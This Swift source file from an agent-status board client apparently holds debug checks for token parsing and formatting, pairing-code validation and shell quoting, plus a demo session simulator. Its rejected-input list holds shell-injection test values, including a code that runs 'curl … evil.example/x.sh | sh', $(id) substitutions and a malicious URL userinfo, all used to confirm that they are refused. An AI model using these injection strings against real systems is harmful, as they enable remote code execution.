        // JavaScript emits both number shapes.
        assert(session(#"{"id":"s","tokens":48200}"#)?.tokens == 48_200, "integer tokens")
        assert(session(#"{"id":"s","tokens":48200.0}"#)?.tokens == 48_200, "float tokens")

        // A session with no figure encodes without the key, so a round trip
        // through this client cannot turn "unknown" into "zero" either.
        if let bare = session(#"{"id":"s"}"#), let data = try? JSONEncoder().encode(bare) {
            assert(!String(decoding: data, as: UTF8.self).contains("tokens"), "absent tokens stay absent")
        } else {
            assertionFailure("session encode")
        }

        // Glance formatting: one decimal from a thousand up, a raw count below
        // it, and never a unit the reader has to convert themselves.
        assert(Session.tokensLabel(for: 0) == "0", "zero")
        assert(Session.tokensLabel(for: 907) == "907", "below a thousand")
        assert(Session.tokensLabel(for: 48_200) == "48.2K", "thousands")
        assert(Session.tokensLabel(for: 486_200) == "486.2K", "hundreds of thousands")
        assert(Session.tokensLabel(for: 999_999) == "1.0M", "never 1000.0K")
        assert(Session.tokensLabel(for: 1_438_000) == "1.4M", "millions")
        assert(Session.tokensLabel(for: 999_999_999) == "1.0B", "never 1000.0M")
        assert(Session(id: "s", name: "", status: .idle, message: "", project: "",
                       createdAt: 0, updatedAt: 0).tokensLabel == nil, "no figure, no label")
    }

    /// Pairing, checked alongside the decoders above when demo mode starts in
    /// a debug build. The pair command is the one string this app tells the
    /// user to paste into a terminal, and three things keep it to the words
    /// it means: the code is validated where it is decoded, the board's
    /// origin is rebuilt from a host with no shell syntax in it, and both are
    /// single-quoted anyway. Each is pinned here, because a screenshot of the
    /// Pair sheet looks the same whether any of them works. The Android
    /// client's ApiParsingTest carries the same cases.
    static func verifyPairing() {
        let decoder = JSONDecoder()
        // JSONSerialization rather than a literal, so newlines and quotes in
        // the cases below reach the decoder as the server would send them.
        func decoded(_ code: String) -> PairCode? {
            guard let data = try? JSONSerialization.data(
                withJSONObject: ["code": code, "expiresInSeconds": 900]) else { return nil }
            return try? decoder.decode(PairCode.self, from: data)
        }

        // The server's shape, stored canonical; undashed is what older servers sent.
        assert(decoded("ABCD-EFGH") == PairCode(code: "ABCD-EFGH", expiresInSeconds: 900), "canonical code")
        assert(decoded("abcd-efgh")?.code == "ABCD-EFGH", "lowercase is uppercased")
        assert(decoded("ABCDEFGH")?.code == "ABCD-EFGH", "undashed is grouped")
        assert(decoded("23456789")?.code == "2345-6789", "digits")

        let rejected = [
            "ABCD-EFGH; curl -fsSL http://evil.example/x.sh | sh #", // the tester's payload
            "ABCD;EFGH", "AB$(id)GH", "ABCD-$(id)", "ABCD`id`",
            "ABCD EFGH", "ABCD-EFGH ", " ABCD-EFGH", "ABCD-EFGH\n", "ABCD\nEFGH",
            "ABCD-EFG#", "ABCD-EFGH#", "ABCD-EFG'",
            // Off the alphabet: I, L, O, 0 and 1 are never minted.
            "ABCD-1234", "ABCD-EFGI", "ABCD-EFGL", "ABCD-EFGO", "ABCD-EFG0",
            // Off the shape.
            "ABC-DEFGH", "ABCD--EFGH", "ABCD-EFGHJ", "ABCDEFG", "ABCD_EFGH", "",
            // Uppercases into the alphabet, but was never ASCII.
            "abcdefgſ", "ＡBCD-EFGH",
        ]
        for code in rejected {
            assert(PairCode.canonical(code) == nil, "canonical(\(code.debugDescription))")
            assert(decoded(code) == nil, "decoded(\(code.debugDescription))")
        }

        // Quoting.
        assert(PairCode.shellQuoted("ABCD-EFGH") == "'ABCD-EFGH'", "plain word")
        assert(PairCode.shellQuoted("it's") == #"'it'\''s'"#, "embedded quote")
        assert(PairCode.shellQuoted("'") == #"''\'''"#, "lone quote")
        assert(PairCode.shellQuoted("") == "''", "empty word")

        let token = "ags_" + String(repeating: "a", count: 32) // built, not written: secret scanners
        func board(_ raw: String) -> Board? {
            URL(string: raw).flatMap(AgStatusAPI.parseBoardURL)
        }
        let code = PairCode(code: "ABCD-EFGH", expiresInSeconds: 900)
        let installer = "curl -fsSL https://agstatus.online/install.sh | sh -s -- "
        assert(code.command(for: Board(baseURL: Board.defaultServer, token: token))
               == installer + "--code 'ABCD-EFGH'", "default server: no --url")
        if let selfHosted = board("https://board.example:8443/w/\(token)") {
            assert(code.command(for: selfHosted)
                   == installer + "--code 'ABCD-EFGH' --url 'https://board.example:8443'", "self-hosted")
        } else {
            assertionFailure("self-hosted board parses")
        }
        // The backstop: a value that never went through a check is still one word.
        assert(PairCode(code: "x'; id; '", expiresInSeconds: 1)
                .command(for: Board(baseURL: Board.defaultServer, token: token))
               == installer + #"--code 'x'\''; id; '\'''"#, "unchecked code stays one word")

        // The origin is rebuilt: userinfo goes, and with it the Android form of this bug.
        let userinfo = board("https://x;$(touch${IFS}pwned1);@agstatus.online/w/\(token)")
        assert(userinfo?.baseURL.absoluteString == "https://agstatus.online", "userinfo dropped")
        assert(userinfo?.isDefaultServer == true, "and so no --url at all")
        // The host is guarded: the rebuild keeps it, so shell syntax in it is refused.
        for raw in ["https://x$(id).example/w/\(token)", "http://a$(id).local:3000",
                    "https://a;b.example/w/\(token)", "https://a'b.example",
                    "https://a%3Bb.example/w/\(token)",
                    // Look-alikes Foundation's IDNA maps to ASCII `;`, `$()`, `'`
                    // and `;` again: the guard sees the mapped host, not these.
                    "https://a\u{FF1B}b.example/w/\(token)", "https://a\u{FF04}\u{FF08}id\u{FF09}.example",
                    "https://a\u{FF07}b.example", "https://a\u{037E}b.example"] {
            assert(board(raw) == nil, "host refused: \(raw)")
        }
        // ...and nothing a real board uses is. ApiParsingTest takes the same ones.
        assert(board("http://192.168.1.10:8080/")?.baseURL.absoluteString == "http://192.168.1.10:8080", "LAN IPv4")
        assert(board("http://agstatus.local:4000")?.baseURL.absoluteString == "http://agstatus.local:4000", ".local")
        assert(board("http://dev_pc.local:3000")?.baseURL.absoluteString == "http://dev_pc.local:3000",
               "an underscore is not shell syntax")
        assert(board("https://my_host.example/w/\(token)")?.baseURL.absoluteString == "https://my_host.example",
               "nor over https")
        assert(board("https://bücher.example/w/\(token)")?.baseURL.absoluteString
               == "https://xn--bcher-kva.example", "IDN arrives as punycode")
        assert(board("https://агстатус.рф/w/\(token)")?.baseURL.absoluteString
               == "https://xn--80aai0dbebi.xn--p1ai", "a whole IDN host too")
    }
    #endif

    // MARK: Internals

    private static func advance(_ session: Session, at now: Int64) -> Session {
        var next = session
        let status = transitions[session.status]?.randomElement() ?? session.status

        // A stopped agent emits nothing at all.
        //
        // `blocked` means it halted to ask a human, and `done` means it handed
        // the turn back — in both the process is waiting, so no hook fires and
        // the board hears nothing until something actually changes. The demo
        // used to re-stamp `updatedAt` and swap the message on these anyway,
        // every few seconds, which was two lies at once: the board never
        // receives such an update, and re-stamping resets the very interval the
        // closing beat measures, so a card that had genuinely been waiting
        // three minutes silently became one that had waited four seconds.
        //
        // Now a waiting card holds completely still until it moves, and the
        // wait it reports on the way out is real.
        guard status != session.status || session.status.isActive else { return session }

        next.status = status
        if status != session.status || Bool.random() {
            next.message = messages[status]?.randomElement() ?? session.message
        }
        next.updatedAt = now
        next.tokens = spend(next.tokens, working: status.isActive)
        return next
    }

    /// What a demo session's lifetime total does between ticks.
    ///
    /// Only a working agent spends, so a card sitting in `done` or `blocked`
    /// holds its figure still — on this board a number that moves is supposed
    /// to mean something changed.
    ///
    /// The session that starts without a total is the one worth watching: a
    /// real one gets its first figure minutes after the card appears, on the
    /// hook's 15-minute throttle, so the demo eventually hands it one. A
    /// reviewer then sees both halves of the contract — a card with no number,
    /// and the number turning up later without the card being rebuilt.
    private static func spend(_ tokens: Int64?, working: Bool) -> Int64? {
        guard working else { return tokens }
        guard let tokens else {
            return Double.random(in: 0..<1) < 0.2 ? Int64.random(in: 18_000...44_000) : nil
        }
        return tokens + Int64.random(in: 4_000...26_000)
    }

    /// Weighted plausible transitions (duplicates raise the odds of staying put).
    private static let transitions: [AgentStatus: [AgentStatus]] = [
        .idle: [.planning, .planning, .idle],
        .planning: [.coding, .coding, .planning],
        .coding: [.coding, .coding, .coding, .testing],
        .testing: [.testing, .coding, .done, .blocked],
        .blocked: [.blocked, .blocked, .coding],
        .done: [.done, .done, .planning],
    ]

    private static let messages: [AgentStatus: [String]] = [
        .idle: [
            "Waiting for a task",
            "Session idle",
        ],
        .planning: [
            "Reading the codebase…",
            "Exploring src/ for entry points",
            "Drafting an implementation plan",
            "Reviewing open issues",
        ],
        .coding: [
            "Editing src/auth/token.ts",
            "Refactoring api/routes.ts",
            "Implementing retry with backoff",
            "Writing SessionStore.swift",
            "Fixing null check in parser.js",
        ],
        .testing: [
            "npm test",
            "Running unit tests…",
            "pytest -q — 87 passed",
            "vitest run — 3 suites",
        ],
        .blocked: [
            "Needs permission approval",
            "Waiting for your input",
            "Merge conflict needs review",
        ],
        .done: [
            "All tasks complete",
            "PR ready for review",
            "Finished — 12 files changed",
        ],
    ]

    private static func nowMillis() -> Int64 {
        Int64(Date().timeIntervalSince1970 * 1000)
    }
}
